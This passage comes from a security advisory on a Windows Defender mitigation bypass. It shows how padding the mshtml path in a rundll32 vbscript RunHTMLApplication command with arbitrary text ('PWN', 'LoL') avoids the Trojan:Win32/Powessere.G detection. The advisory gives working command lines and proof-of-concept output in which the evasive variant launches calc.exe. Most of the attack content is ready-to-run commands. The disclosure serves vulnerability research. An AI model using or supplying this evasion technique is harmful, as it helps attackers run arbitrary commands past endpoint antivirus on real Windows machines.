Attempts at execution fail\nand attackers will typically get an \"Access is denied\" error message. Previously I have disclosed 3 bypasses using rundll32 javascript, this example leverages VBSCRIPT and ActiveX engine.\n\nRunning rundll32 vbscript:\"\\\\..\\\\mshtml\\\\..\\\\mshtml\\\\..\\\\mshtml,RunHTMLApplication \"+String(CreateObject(\"Wscript.Shell\").Run(\"calc.exe\"),0), will typically get blocked by Windows Defender with\nan \"Access is denied\" message.\n\nTrojan:Win32/Powessere.G\nCategory: Trojan\nThis program is dangerous and executes commands from an attacker.\n\nHowever, you can add arbitrary text for the 2nd mshtml parameter to build off my previous javascript based bypasses to skirt defender detection.\nExample, adding \"shtml\", \"Lol\" or other text and it will execute as of the time of this writing.\n\nE.g.\n\nC:\\sec>rundll32 vbscript:\"\\\\..\\\\mshtml\\\\..\\\\PWN\\\\..\\\\mshtml,RunHTMLApplication \"+String(CreateObject(\"Wscript.Shell\").Run(\"calc.exe\"),0)\n\n\n[References]\nhttps://twitter.com/hyp3rlinx/status/1759260962761150468\nhttps://hyp3rlinx.altervista.org/advisories/MICROSOFT_WINDOWS_DEFENDER_TROJAN.WIN32.POWESSERE.G_MITIGATION_BYPASS_PART_3.txt\nhttps://lolbas-project.github.io/lolbas/Binaries/Rundll32/\n\n\n[Exploit/POC]\nOpen command prompt as Administrator\n\nC:\\sec>rundll32 vbscript:\"\\\\..\\\\mshtml\\\\..\\\\mshtml\\\\..\\\\mshtml,RunHTMLApplication \"+String(CreateObject(\"Wscript.Shell\").Run(\"calc.exe\"),0)\nAccess is denied.\n\nC:\\sec>rundll32 vbscript:\"\\\\..\\\\mshtml\\\\..\\\\LoL\\\\..\\\\mshtml,RunHTMLApplication \"+String(CreateObject(\"Wscript.Shell\").Run(\"calc.exe\"),0)\n\nWe win!\n\n[Network Access]\nLocal\n\n\n[Severity]\nHigh\n\n\n[Disclosure Timeline]\nVendor Notification:  \nFebruary 18, 2024 : Public Disclosure\n\n\n\n[+] Disclaimer\nThe information contained within this advisory is supplied \"as-is\" with no warranties or guarantees of fitness of use or otherwise.\nPermission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and\nthat due credit is given.
